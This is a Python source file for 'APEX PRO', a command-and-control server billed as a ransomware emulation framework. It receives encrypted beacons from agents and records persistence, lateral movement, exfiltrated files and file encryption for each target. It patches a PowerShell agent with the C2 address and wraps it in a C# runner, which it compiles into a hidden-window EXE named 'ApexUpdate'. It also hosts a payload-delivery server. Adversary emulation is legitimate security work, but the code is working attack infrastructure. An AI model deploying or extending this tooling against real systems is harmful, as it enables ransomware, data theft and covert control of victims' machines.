import asyncio, aiosqlite, os, json, cmd, threading, time, sys, base64, re, urllib.request, socket, sqlite3
# --- CRYPTOGRAPHY IMPORTS ---
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
# ----------------------------
from quart import Quart, request, jsonify
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.text import Text
from rich.progress import Progress, SpinnerColumn, TextColumn
from hypercorn.config import Config
from hypercorn.asyncio import serve
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from fpdf import FPDF

# --- INITIALIZATION ---
console = Console()
app = Quart(__name__)
DB_FILE = "apex_vault.db"
C2_PORT = 5000

# --- SHARED KEY (MUST MATCH AGENT) ---
SHARED_KEY = b"12345678901234567890123456789012"

# --- GLOBAL CONFIGURATION ---
state = {
    "LHOST": "192.168.56.1",
    "LPORT": "5000",
    "SRVPORT": "8000",
    "C2_RUNNING": False,
    "FILE_RUNNING": False
}

# Global holder for the file server instance
file_server_instance = None

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

# --- DATABASE ENGINE ---
async def init_db():
    """Initializes the database schema and ensures tables exist."""
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute('CREATE TABLE IF NOT EXISTS targets (id INTEGER PRIMARY KEY, ip TEXT UNIQUE, hostname TEXT)')
        await db.execute('CREATE TABLE IF NOT EXISTS persistence (id INTEGER PRIMARY KEY, target_id INTEGER, method TEXT, path TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)')
        await db.execute('CREATE TABLE IF NOT EXISTS lateral (id INTEGER PRIMARY KEY, target_id INTEGER, type TEXT, details TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)')
        await db.execute('CREATE TABLE IF NOT EXISTS exfil (id INTEGER PRIMARY KEY, target_id INTEGER, file_name TEXT, size TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)')
        await db.execute('CREATE TABLE IF NOT EXISTS encryption (id INTEGER PRIMARY KEY, target_id INTEGER, file_name TEXT, status TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)')
        await db.commit()

# --- DECRYPTION HELPER ---
def decrypt_binary_payload(raw_data):
    """
    Deciphers the raw binary blob received from the agent.
    Format: [IV (16 bytes)] + [AES-256-CBC Ciphertext]
    """
    try:
        if len(raw_data) < 16:
            raise ValueError("Payload too short")
            
        iv = raw_data[:16]
        ciphertext = raw_data[16:]
        
        cipher = Cipher(algorithms.AES(SHARED_KEY), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        
        # AES-CBC Decryption
        padded_data = decryptor.update(ciphertext) + decryptor.finalize()
        
        # PKCS7 Unpadding
        unpadder = padding.PKCS7(128).unpadder()
        decrypted_data = unpadder.update(padded_data) + unpadder.finalize()
        
        return decrypted_data.decode('utf-8')
    except Exception as e:
        # Re-raise to be caught in the main route
        raise ValueError(f"Decryption Failure: {str(e)}")

# --- C2 SERVER ROUTES ---
@app.route('/api/v1/telemetry', methods=['POST'])
async def telemetry():
    ip = request.remote_addr
    
    # CRITICAL CHANGE: Get raw bytes (octet-stream), not decoded text
    raw_payload = await request.get_data()
    
    if not raw_payload:
        return jsonify({"status": "error", "message": "Empty Payload"}), 400

    try:
        # 1. Decrypt (Running in thread to prevent blocking the async loop)
        decrypted = await asyncio.to_thread(decrypt_binary_payload, raw_payload)
        
        async with aiosqlite.connect(DB_FILE) as db:
            # 2. Identify or Create Target
            await db.execute("INSERT OR IGNORE INTO targets (ip, hostname) VALUES (?, ?)", (ip, "LAB-TARGET"))
            cursor = await db.execute("SELECT id FROM targets WHERE ip = ?", (ip,))
            row = await cursor.fetchone()
            tid = row[0]
            
            # 3. Parse Tactical Data
            # Expected Format: "PREFIX|Data1|Data2"
            parts = decrypted.split("|")
            
            # Safety check for malformed data
            if len(parts) < 1:
                return jsonify({"status": "error", "message": "Invalid Format"}), 400
                
            prefix = parts[0]

            if prefix == "PERSIST":
                p_method = parts[1] if len(parts) > 1 else "Unknown"
                p_path = parts[2] if len(parts) > 2 else "Unknown"
                await db.execute("INSERT INTO persistence (target_id, method, path) VALUES (?, ?, ?)", (tid, p_method, p_path))
                console.print(f"\n[bold green][+][/] PERSISTENCE INSTALLED: {p_method} on {ip}")

            elif prefix == "LATERAL":
                l_type = parts[1] if len(parts) > 1 else "Unknown"
                l_details = parts[2] if len(parts) > 2 else "Unknown"
                await db.execute("INSERT INTO lateral (target_id, type, details) VALUES (?, ?, ?)", (tid, l_type, l_details))
                console.print(f"\n[bold yellow][!][/] LATERAL MOVEMENT: {l_type} target identified at {ip}")

            elif prefix == "CANARY":
                c_file = parts[1] if len(parts) > 1 else "Unknown"
                await db.execute("INSERT INTO lateral (target_id, type, details) VALUES (?, ?, ?)", (tid, "CANARY_TRIP", f"File: {c_file}"))
                console.print(f"\n[bold red][!!!] CANARY TRIPPED: Target {ip} touched monitored file: {c_file}")

            elif prefix == "EXFIL":
                e_name = parts[1] if len(parts) > 1 else "Unknown"
                e_size = parts[2] if len(parts) > 2 else "0"
                await db.execute("INSERT INTO exfil (target_id, file_name, size) VALUES (?, ?, ?)", (tid, e_name, e_size))
                console.print(f"\n[bold magenta][⚡] DATA EXFILTRATED:[/] {e_name} ({e_size} bytes) from {ip}")

            elif prefix == "ENC":
                enc_file = parts[1] if len(parts) > 1 else "Unknown"
                enc_status = parts[2] if len(parts) > 2 else "Unknown"
                await db.execute("INSERT INTO encryption (target_id, file_name, status) VALUES (?, ?, ?)", (tid, enc_file, enc_status))

            elif prefix == "LIST":
                # JSON payload might be in parts[1]
                if len(parts) > 1:
                    try:
                        file_list = json.loads(parts[1])
                        for f in file_list:
                            await db.execute("INSERT INTO exfil (target_id, file_name, size) VALUES (?, ?, ?)", (tid, f['Name'], str(f['Length'])))
                        console.print(f"\n[bold cyan][*][/] FILE INVENTORY RECEIVED: {len(file_list)} items from {ip}")
                    except json.JSONDecodeError:
                        console.print(f"\n[bold red][!] JSON Error from {ip}[/]")

            await db.commit()
        return jsonify({"status": "ok"}), 200
        
    except Exception as e:
        # Detailed error printing for debugging
        # console.print(f"\n[bold red][!] Processing Error: {str(e)}[/]")
        return jsonify({"status": "error", "message": str(e)}), 400

# --- REAL-TIME FEEDBACK THREAD ---
def monitor_events():
    """
    Background thread that monitors the SQLite database for new tactical events.
    Automatically distinguishes between Encryption and Restoration alerts.
    """
    # 1. Initialize with the exact current time to ignore stale data on startup
    last_check_time = time.strftime('%Y-%m-%d %H:%M:%S')
    
    while True:
        try:
            if os.path.exists(DB_FILE):
                conn = sqlite3.connect(DB_FILE)
                # Use row factory to access columns by name
                conn.row_factory = sqlite3.Row
                cursor = conn.cursor()
                
                latest_event_time = last_check_time
                found_new = False

                # Scan through all major tactical tables
                for table in ["persistence", "lateral", "exfil", "encryption"]:
                    query = f"""
                        SELECT t.ip, a.* FROM {table} a 
                        JOIN targets t ON a.target_id = t.id 
                        WHERE a.timestamp > ? 
                        ORDER BY a.timestamp ASC
                    """
                    cursor.execute(query, (last_check_time,))
                    rows = cursor.fetchall()
                    
                    for row in rows:
                        ip = row['ip']
                        event_time = row['timestamp']
                        
                        # Default visual style
                        label = table.upper()
                        color = "bold cyan"
                        
                        # LOGIC PATCH: Check specifically for Decryption/Restoration status
                        if table == "encryption":
                            # Check if the status column contains restoration keywords
                            status_val = str(row['status'])
                            if "RESTORED" in status_val or "Decrypt" in status_val:
                                label = "DECRYPTION / RESTORE"
                                color = "bold green"
                            else:
                                label = "ENCRYPTION"
                                color = "bold red"

                        # Print the unified tactical alert
                        console.print(f"\n[{color}][ALERT][/] New {label} activity from [bold white]{ip}[/]")
                        
                        # Track the most recent event time found in this loop
                        if event_time > latest_event_time:
                            latest_event_time = event_time
                        found_new = True
                
                # 2. Update the tracker to prevent re-alerting on processed rows
                if found_new:
                    last_check_time = latest_event_time
                
                conn.close()
        except Exception:
            # Silent fail to prevent background thread crashes from interrupting the shell
            pass 
            
        time.sleep(5) # 5-second polling interval

# --- INTERACTIVE C2 SHELL ---
class ApexC2Shell(cmd.Cmd):
    prompt = "" 

    def __init__(self):
        super().__init__()
        self.do_splash(None)

    def postcmd(self, stop, line):
        print("") 
        console.print("[bold red]APEX-C2[/] > ", end="")
        return stop

    def do_splash(self, arg):
        os.system('cls' if os.name == 'nt' else 'clear')
        
        # Security & Cert Logic
        has_certs = os.path.exists("apex_cert.pem") and os.path.exists("apex_key.pem")
        cert_status = "[bold green]VALID (apex_cert.pem)[/]" if has_certs else "[bold red]MISSING[/]"
        protocol = "HTTPS (TLS 1.2)" if state["C2_RUNNING"] else "HTTPS (PENDING)"
        
        c2_status = "[bold green]ONLINE[/]" if state["C2_RUNNING"] else "[bold red]OFFLINE[/]"
        file_status = "[bold green]ONLINE[/]" if state["FILE_RUNNING"] else "[bold red]OFFLINE[/]"

        console.print(r"""[bold red]
 █████╗ ██████╗ ███████╗██╗  ██╗    ██████╗ ██████╗  ██████╗ 
██╔══██╗██╔══██╗██╔════╝╚██╗██╔╝     ██╔══██╗██╔══██╗██╔═══██╗
███████║██████╔╝█████╗   ╚███╔╝      ██████╔╝██████╔╝██║   ██║
██╔══██║██╔═══╝ ██╔══╝   ██╔██╗      ██╔═══╝ ██╔══██╗██║   ██║
██║  ██║██║     ███████╗██╔╝ ██╗     ██║     ██║  ██║╚██████╔╝
╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝     ╚═╝     ╚═╝  ╚═╝ ╚═════╝ [/]
        [bold white]⚡ APEX PRO v2.0: RANSOMWARE EMULATION FRAMEWORK[/]
     [bold grey][ ADVERSARY EMULATION & PURPLE TEAM FRAMEWORK ][/]
        """)

        info_table = Table(box=None, show_header=False, padding=(0, 2))
        info_table.add_column("Key", style="bold cyan")
        info_table.add_column("Value", style="white")

        info_table.add_row("OPERATOR IP", f"{state['LHOST']}")
        info_table.add_row("C2 ENDPOINT", f"https://{state['LHOST']}:{state['LPORT']}/api/v1/telemetry")
        info_table.add_row("FILE SERVER", f"http://{state['LHOST']}:{state['SRVPORT']} ({file_status})")
        info_table.add_row("SECURITY", f"{protocol} - {c2_status}")
        info_table.add_row("SSL CERTS", cert_status)

        console.print(Panel(info_table, title="[bold white]APEX PRO v2.9 - SECURE C2 HYPERVISOR[/]", border_style="red", expand=False))

    def do_usage(self, arg):
        self.do_splash(None)
        table = Table(
            title="[bold cyan]APEX PRO TACTICAL COMMAND SPECIFICATION[/]",
            show_header=True, header_style="bold cyan", border_style="bold red",
            box=None, padding=(0, 1), collapse_padding=True
        )

        table.add_column("COMMAND", style="bold yellow", width=12)
        table.add_column("DESCRIPTION", style="white", width=35)
        table.add_column("EXAMPLE", style="bold green", width=30)

        table.add_row("set", "Configure LHOST/LPORT/SRVPORT", "set lhost 192.168.56.1")
        table.add_row("run", "Start C2 Telemetry Listener", "run")
        table.add_row("serve", "Start Payload Delivery Server", "serve")
        table.add_row("build", "Patch PS1 & Inject into CS", "build")
        table.add_row("compile", "Generate Visible Agent EXE", "compile x64")
        table.add_row("gen_dec", "Generate Simulation Decryptor", "gen_dec x86")
        table.add_row("report", "Full Tactical Mission Report", "report")
        table.add_row("summary", "View Targets & Exfil Stats", "summary")
        table.add_row("logs", "View Event History", "logs")
        table.add_row("splash", "Refresh UI & Status", "splash")
        table.add_row("reset_db", "Wipe Tactical Database", "reset_db")
        table.add_row("exit", "Secure Tactical Shutdown", "exit")

        console.print(table)
        console.print(f"[bold red]" + "─" * 82 + "[/]")

    def help_report(self): 
        console.print("[bold yellow]report[/]: Generates a detailed breakdown of all activity (Persistence, Exfil, Encryption) for every identified target in the vault.")

    def help_set(self): console.print("[bold yellow]set[/]: Updates global variables like LHOST or LPORT.")
    def help_run(self): console.print("[bold yellow]run[/]: Activates the C2 listener to receive agent pings.")
    def help_serve(self): console.print("[bold yellow]serve[/]: Starts the HTTP server for payload delivery.")
    def help_build(self): console.print("[bold yellow]build[/]: Patches the PS1 script with current network info.")
    def help_compile(self): console.print("[bold yellow]compile[/]: Compiles the C# runner into a Windows EXE.")
    def help_gen_dec(self): console.print("[bold yellow]gen_dec[/]: Creates the decryptor for simulation recovery.")
    def help_summary(self): console.print("[bold yellow]summary[/]: Displays an overview of compromised targets.")
    def help_logs(self): console.print("[bold yellow]logs[/]: Prints the raw tactical event logs from the DB.")
    def help_exit(self): console.print("[bold yellow]exit[/]: Closes all sockets and exits safely.")

    def do_logs(self, arg):
        async def fetch_logs():
            async with aiosqlite.connect(DB_FILE) as db:
                db.row_factory = aiosqlite.Row
                log_table = Table(title="Tactical Event Logs", border_style="cyan")
                log_table.add_column("Timestamp", style="dim")
                log_table.add_column("Type", style="bold yellow")
                log_table.add_column("Data", style="green")

                query = """
                SELECT timestamp, 'PERSIST' as type, method || ': ' || path as info FROM persistence
                UNION SELECT timestamp, 'LATERAL', type || ': ' || details FROM lateral
                UNION SELECT timestamp, 'EXFIL', file_name || ' (' || size || ' bytes)' FROM exfil
                UNION SELECT timestamp, 'ENC', file_name || ' [' || status || ']' FROM encryption
                ORDER BY timestamp DESC LIMIT 30
                """
                rows = await (await db.execute(query)).fetchall()
                for r in rows:
                    log_table.add_row(r[0], r[1], r[2])
                console.print(log_table)
        asyncio.run(fetch_logs())

    def do_reset_db(self, arg):
        if os.path.exists(DB_FILE):
            try:
                os.remove(DB_FILE)
                console.print("[bold yellow][!] Database file deleted.[/]")
            except Exception as e:
                console.print(f"[bold red][-] Reset failed: {e}[/]"); return
        asyncio.run(init_db())
        console.print("[bold green][+] Database re-initialized.[/]")

    def do_build(self, arg):
        """Patches ApexSim.ps1 (HTTPS) and injects into ApexRunner.cs."""
        PS_PATH = "ApexSim.ps1"
        CS_PATH = "ApexRunner.cs"
        
        try:
            with open(PS_PATH, "r", encoding="utf-8") as f:
                ps_content = f.read()
            
            # 1. Patch the URL to use HTTPS and the current LHOST/LPORT
            new_url = f'https://{state["LHOST"]}:{state["LPORT"]}/api/v1/telemetry'
            # This regex finds the C2Url variable and swaps the whole string
            ps_content = re.sub(r'\$C2Url\s*=\s*"[^"]+"', f'$C2Url = "{new_url}"', ps_content)
            
            with open(PS_PATH, "w", encoding="utf-8") as f:
                f.write(ps_content)
            
            # 2. Encode the patched script
            b64 = base64.b64encode(ps_content.encode('utf-8')).decode('utf-8')
            
            # 3. Inject into the C# Runner
            with open(CS_PATH, "r", encoding="utf-8") as f:
                cs_content = f.read()
            
            # Matches: string encodedScript = @"...";
            pattern = r'(string\s+encodedScript\s*=\s*@")([^"]*)(")'
            updated_cs = re.sub(pattern, rf'\1{b64}\3', cs_content)
            
            with open(CS_PATH, "w", encoding="utf-8") as f:
                f.write(updated_cs)
            
            console.print(f"[bold green][✓] HTTPS BUILD SUCCESSFUL[/]")
            console.print(f"    Target URL: [cyan]{new_url}[/]")
            
        except Exception as e:
            console.print(f"[bold red][-] Build Error: {e}[/]")

    def do_compile(self, arg):
        arch = arg.strip().lower()
        if arch not in ("x86", "x64"):
            console.print("[bold red][-] Usage: compile x86 | x64[/]")
            return

        ps_dll = "System.Management.Automation.dll"
        if not os.path.exists(ps_dll):
            console.print(f"[bold red][!] Missing: {ps_dll} in local directory[/]")
            return

        # 1. Read the PS1 file you verified is working
        with open("ApexSim.ps1", "r") as f:
            ps_code = f.read()
        
        # 2. Convert to Base64 for the REPLACE_ME logic
        encoded_payload = base64.b64encode(ps_code.encode()).decode()

        # 3. Read the C# Template
        with open("ApexRunner.cs", "r") as f:
            cs_template = f.read()

        # 4. Patch the template with the payload
        final_cs = cs_template.replace("REPLACE_ME", encoded_payload)

        # 5. Write the final source to a temporary file for the compiler
        build_file = "ApexRunner_built.cs"
        with open(build_file, "w") as f:
            f.write(final_cs)

        out = f"ApexUpdate_{arch}.exe"
        
        # 6. Build Command (-target:winexe hides the console window)
        cmd = f"mcs -target:winexe -optimize+ -platform:{arch} -out:{out} -r:{ps_dll} {build_file}"

        if os.system(cmd) == 0:
            console.print(f"[bold green][✓] Compiled {out} ({arch}) successfully[/]")
            if os.path.exists(build_file):
                os.remove(build_file)
        else:
            console.print("[bold red][-] Compilation Failed: Ensure mcs is installed.[/]")


    def do_gen_dec(self, arg):
        """Generates the standalone Decryptor binary using fixed replacement logic."""
        arch = arg.strip().lower() if arg else "x86"
        
        if arch not in ("x86", "x64"):
            console.print("[bold red][-] Usage: gen_dec x86 | x64[/]")
            return

        # 1. Load PS1 and force Decrypt mode via Regex
        with open("ApexSim.ps1", "r") as f:
            ps_code = f.read()
        
        # Patch the script content to default to Decrypt mode
        ps_code = re.sub(r'(\$Mode\s*=\s*)"Encrypt"', r'\1"Decrypt"', ps_code)
        encoded_payload = base64.b64encode(ps_code.encode()).decode()

        # 2. Load C# Template
        with open("ApexRunner.cs", "r") as f:
            cs_template = f.read()
        
        # Use the fixed replacement (removed @ if you prefer standard string)
        final_cs = cs_template.replace("REPLACE_ME", encoded_payload)
        
        build_file = "ApexDecryptor_build.cs"
        with open(build_file, "w") as f:
            f.write(final_cs)

        out = "ApexDecryptor.exe"
        # Ensure we point to the local Automation DLL
        cmd = f"mcs -target:winexe -optimize+ -platform:{arch} -out:{out} -r:System.Management.Automation.dll {build_file}"

        if os.system(cmd) == 0:
            console.print(f"[bold green][✓] SUCCESS:[/] {out} generated for {arch}.")
            if os.path.exists(build_file): os.remove(build_file)
        else:
            console.print("[bold red][-] Decryptor Build Failed. Check mcs logs.[/]")

    def do_summary(self, arg):
        async def run_query():
            async with aiosqlite.connect(DB_FILE) as db:
                db.row_factory = aiosqlite.Row
                targets = await (await db.execute("SELECT * FROM targets")).fetchall()
                table = Table(title="Tactical Asset Overview", border_style="red")
                table.add_column("IP Address", style="green")
                table.add_column("Persistence", style="yellow")
                table.add_column("Exfil", style="magenta")
                for t in targets:
                    p = await (await db.execute("SELECT COUNT(*) FROM persistence WHERE target_id=?", (t['id'],))).fetchone()
                    ex = await (await db.execute("SELECT COUNT(*) FROM exfil WHERE target_id=?", (t['id'],))).fetchone()
                    table.add_row(t['ip'], "ACTIVE" if p[0]>0 else "NONE", str(ex[0]))
                console.print(table)
        asyncio.run(run_query())

    def do_run(self, arg):
        """Starts the HTTPS C2 Telemetry Listener with SSL encryption."""
        if state["C2_RUNNING"]:
            console.print("[bold yellow][!] C2 Server is already active.[/]")
            return

        # Check if certs exist before starting
        if not os.path.exists("apex_cert.pem") or not os.path.exists("apex_key.pem"):
            console.print("[bold red][-][/] Error: apex_cert.pem or apex_key.pem not found!")
            console.print("[white]Generate them using: openssl req -x509 -newkey rsa:4096 -keyout apex_key.pem -out apex_cert.pem -days 365 -nodes[/]")
            return

        state["C2_RUNNING"] = True
        threading.Thread(target=run_c2_server, daemon=True).start()
        
        console.print(Panel(
            f"[bold green][✓] APEX C2 HYPERVISOR ACTIVE[/]\n"
            f"[bold white]Endpoint:[/] https://{state['LHOST']}:{state['LPORT']}/api/v1/telemetry\n"
            f"[bold cyan]Security:[/] TLS 1.2 (SSL ENABLED)\n"
            f"[bold yellow]Certs:[/] apex_cert.pem / apex_key.pem",
            border_style="cyan", expand=False
        ))
        
    def do_set(self, arg):
        """Configures tactical variables (LHOST, LPORT, SRVPORT)."""
        try:
            parts = arg.split()
            if len(parts) != 2:
                console.print("[bold yellow][!] Usage: set <variable> <value>[/]")
                return

            key = parts[0].upper()
            value = parts[1]

            if key in state:
                if key == "LHOST":
                    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
                    if not ip_pattern.match(value):
                        console.print("[bold red][-] Error: Invalid IP address format.[/]")
                        return
                
                state[key] = value
                console.print(f"[bold green][✓] {key} updated to: {value}[/]")
                self.do_splash(None)
            else:
                console.print(f"[bold red][-] Error: '{key}' is not a valid configuration variable.[/]")

        except Exception as e:
            console.print(f"[bold red][-] Failed to set variable: {e}[/]")

    def do_serve(self, arg):
        """Starts the Delivery Server using LHOST and SRVPORT."""
        global file_server_instance
        if state['FILE_RUNNING']:
            console.print("[bold yellow][!] File server is already running.[/]")
            return

        def start_server():
            global file_server_instance
            try:
                TCPServer.allow_reuse_address = True
                file_server_instance = TCPServer((state['LHOST'], int(state['SRVPORT'])), SimpleHTTPRequestHandler)
                state['FILE_RUNNING'] = True
                console.print(f"\n[bold green][SUCCESS] FILE SERVER ACTIVE ON {state['LHOST']}:{state['SRVPORT']}[/]")
                file_server_instance.serve_forever()
            except Exception as e:
                console.print(f"[bold red][-] File Server Error: {e}[/]")

        threading.Thread(target=start_server, daemon=True).start()

    def do_report(self, arg):
        """Generates the PDF with automatic watermarks on ALL pages."""
        try:
            # 1. Setup local PDF class with Watermark Header
            class ApexPDF(FPDF):
                def header(self):
                    # Set watermark font
                    self.set_font("Helvetica", 'B', 50)
                    self.set_text_color(235, 235, 235) # Very light grey
                    # Rotate 45 degrees around the center of the page
                    self.rotate(45, 105, 145)
                    self.text(40, 160, "C L A S S I F I E D")
                    # Reset rotation for the rest of the page content
                    self.rotate(0)

            # 2. Database Connection
            conn = sqlite3.connect(DB_FILE)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()

            targets = cursor.execute("SELECT * FROM targets").fetchall()
            if not targets:
                console.print("[bold yellow][!] No data found.[/]"); return

            # 3. Initialize the Custom PDF
            pdf = ApexPDF()
            pdf.set_auto_page_break(auto=True, margin=15)

            for target in targets:
                tid, ip = target['id'], target['ip']
                console.print(f"[bold cyan][*] Compiling Intelligence for {ip}...[/]")
                
                # Each add_page() now automatically triggers the 'header' watermark
                pdf.add_page()

                # --- BLACK HEADER BANNER ---
                pdf.set_fill_color(0, 0, 0) # Black
                pdf.set_text_color(255, 255, 255) # White
                pdf.set_font("Helvetica", 'B', 16)
                pdf.cell(0, 15, f"MISSION DEBRIEF // TARGET: {ip}", ln=True, align='C', fill=True)
                
                # Metadata
                pdf.ln(5)
                pdf.set_text_color(0, 0, 0) # Reset to black for content
                pdf.set_font("Helvetica", 'B', 10)
                pdf.cell(0, 7, f"DATABASE ID: {tid}", ln=True)
                pdf.cell(0, 7, f"GEN_TIME: {time.strftime('%Y-%m-%d %H:%M:%S')}", ln=True)
                pdf.ln(5)

                # --- SECTION BUILDER ---
                def add_pdf_sect(title, table_name):
                    pdf.set_font("Helvetica", 'B', 11)
                    pdf.set_fill_color(40, 40, 40) # Dark grey sub-header
                    pdf.set_text_color(255, 255, 255)
                    pdf.cell(0, 8, f" {title}", ln=True, fill=True)
                    
                    pdf.set_text_color(0, 0, 0)
                    pdf.set_font("Courier", '', 9)
                    
                    rows = cursor.execute(f"SELECT * FROM {table_name} WHERE target_id=?", (tid,)).fetchall()
                    if not rows:
                        pdf.cell(0, 7, " > NO ACTIVITY LOGGED", ln=True)
                    else:
                        for r in rows:
                            data_points = [str(r[k]) for k in r.keys() if k not in ['id', 'target_id', 'timestamp']]
                            pdf.multi_cell(0, 7, f" > {' | '.join(data_points)}", border='B')
                    pdf.ln(4)

                add_pdf_sect("PHASE I: PERSISTENCE", "persistence")
                add_pdf_sect("PHASE II: EXFILTRATION", "exfil")
                add_pdf_sect("PHASE III: ENCRYPTION", "encryption")
                add_pdf_sect("PHASE IV: LATERAL MOVEMENT", "lateral")

            # 4. Finalize
            output_file = "Apex_Mission_Report.pdf"
            pdf.output(output_file)
            conn.close()
            console.print(Panel(f"[bold green][✓] MISSION REPORT EXPORTED[/]\n[white]Status: Report Complete - Watermark applied to ALL pages.", border_style="red"))

        except Exception as e:
            console.print(f"[bold red][!] Report Failure: {e}[/]")

    def do_exit(self, arg):
        """Sequential shutdown."""
        global file_server_instance
        console.print("\n[bold red][!] SHUTDOWN SEQUENCE INITIATED...[/]")
        
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
            # Step 1: C2 Port
            t1 = progress.add_task(description="Closing C2 Network Listener...", total=1)
            time.sleep(0.6)
            progress.update(t1, completed=1)
            console.print("[bold green][✓][/] C2 Network socket closed.")

            # Step 2: Stop File Server
            t2 = progress.add_task(description="Shutting down Payload Delivery Server...", total=1)
            if file_server_instance:
                file_server_instance.shutdown()
                file_server_instance.server_close()
            time.sleep(0.6)
            progress.update(t2, completed=1)
            console.print("[bold green][✓][/] File server (Port 8000) terminated.")

            # Step 3: Database Sync
            t3 = progress.add_task(description="Securing database vault...", total=1)
            time.sleep(0.8)
            progress.update(t3, completed=1)
            console.print("[bold green][✓][/] Database handles safely closed.")

            # Step 4: Cache Purge
            t4 = progress.add_task(description="Purging session cache...", total=1)
            time.sleep(0.5)
            progress.update(t4, completed=1)
            console.print("[bold green][✓][/] Memory cache empty.")

        console.print(Panel(
            "[bold white]SESSION SECURED[/]\n[red]APEX PRO CONSOLE OFFLINE[/]", 
            border_style="red", expand=False, padding=(1, 2)
        ))
        os._exit(0)

# --- SERVER & THREADING ---
def run_c2_server():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(init_db())
    
    config = Config()
    config.bind = [f"0.0.0.0:{state['LPORT']}"] 
    config.certfile = "apex_cert.pem"
    config.keyfile = "apex_key.pem"
    
    # FIX 1: Suppress the error logs that trigger the traceback
    config.accesslog = None 
    config.errorlog = None 
    
    try:
        # FIX 2: Catch the TimeoutError specifically to avoid "Unhandled exception"
        loop.run_until_complete(serve(app, config, shutdown_trigger=lambda: asyncio.Future()))
    except (TimeoutError, asyncio.exceptions.TimeoutError):
        # This happens when the agent abruptly closes the SSL connection
        pass
    except Exception as e:
        # Only print "real" fatal errors
        if "SSL" not in str(e):
            console.print(f"[bold red][!] HTTPS Server Failed: {e}[/]")

if __name__ == "__main__":
    # 1. Ensure DB exists
    asyncio.run(init_db())
    
    # 2. Start monitor
    threading.Thread(target=monitor_events, daemon=True).start()
    
    # 3. Launch Shell
    try:
        ApexC2Shell().cmdloop()
    except KeyboardInterrupt:
        os._exit(0)